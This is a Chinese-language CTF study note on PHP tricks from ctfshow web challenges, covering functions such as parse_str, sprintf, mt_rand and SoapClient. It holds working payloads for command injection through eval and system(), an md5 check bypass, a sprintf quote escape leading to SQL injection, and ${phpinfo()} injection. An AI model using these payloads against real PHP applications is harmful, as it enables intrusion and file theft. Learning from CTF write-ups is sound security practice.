PHP专题
基础
ctfshow web102

```
<?=是php的短标签，是echo()的快捷用法 ？？ 
```

#### 数组总比非数组类型大
 #### && > = > and 
#### 内部类 常用`Exception`，其他可用的有 `DirectoryIterator/FilesystemIterator/SplFileObject/GlobIterator/ReflectionClass/ReflectionMethod` ```php // ctfshow web109/web110 eval("echo new $v1($v2());"); // ?v1=Exception&v2=system('tac fl36dg.txt') ``` 
### 考题中会出现的函数
#### get_defined_vars() 返回由所有已定义变量所组成的数组 
#### call_user_func() 函数把第一个参数作为回调函数，其余参数都是回调函数的参数 
#### \_() 是一个函数 
\_()等效于gettext() 是gettext()的拓展函数，需要开启text扩展。`echo gettext("ctfshownb");` `和 echo _("ctfshownb");` 的输出结果都为 ctfshownb 
#### parse_str() 
函数会将传入的第一个参数设置成变量，如果设置了第二参数，则会将第一个参数的变量以数组元素的形式存入到这个数组。 ```php if(isset($_POST['v1'])){ $v1 = $_POST['v1']; $v3 = $_GET['v3']; parse_str($v1,$v2); if($v2['flag']==md5($v3)){ echo $flag; } } // payload GET ?v3=1 & POST:v1=flag=c4ca4238a0b923820dcc509a6f75849b # md5解密后对应1 ``` 
#### strrev() 反转字符串 
#### shell_exec() 缩写为`` 
#### sprintf() 
`sprintf(format,arg1,arg2,arg++)`： 把格式化的字符串写入一个变量中。arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。`%`后的第一个字符，都会被当做字符类型而被吃掉。也就是当做一个类型进行匹配后面的变量。如`%c`匹配ascii码，`%d`匹配整数，如果不在定义中的也会进行匹配，匹配为空。比如`%\`匹配任何参数都为空。 ```php <?php ... $username = addslashes($_POST['username']); $username = sprintf("username = '%s' ",$username); $password = $_POST['password']; ... $sql = sprintf("select * from t where $username and password = '%s' ", $password); ... ?>

payload`username = admin%1$' and 1 = 1#`，可以使**单引号逃逸**，导致存在sql盲注。

#### mt_rand()

`mt_rand(min,max)` 

```php
 <?php
 show_source(__FILE__);
 include "flag.php";
 $a = @$_REQUEST['hello']; // hello没有任何过滤
 $seed = @$_REQUEST['seed'];
 $key = @$_REQUEST['key'];

 mt_srand($seed);
 $true_key = mt_rand();
 if ($key == $true_key){
 	echo "Key Confirm";
 }
 else{
 	die("Key Error");
 }
 eval( "var_dump($a);");
 ?>

AI助手
payload: POST:seed=1&key=1244335972&hello=);system('cat flag.php');echo(0

复杂变量${}
eval('$string = "'.$_GET[cmd].'";');  // payload: http://127.0.0.1/test.php?cmd=${phpinfo()}
1
AI助手
file_get_contents()
函数将整个文件或一个url所指向的文件读入一个字符串中

fsockopen()
fsockopen($hostname,$port,$errno,$errstr,$timeout)用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。

SoapClient
SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的__call方法，那么__call便方法可以发送HTTP和HTTPS请求。


                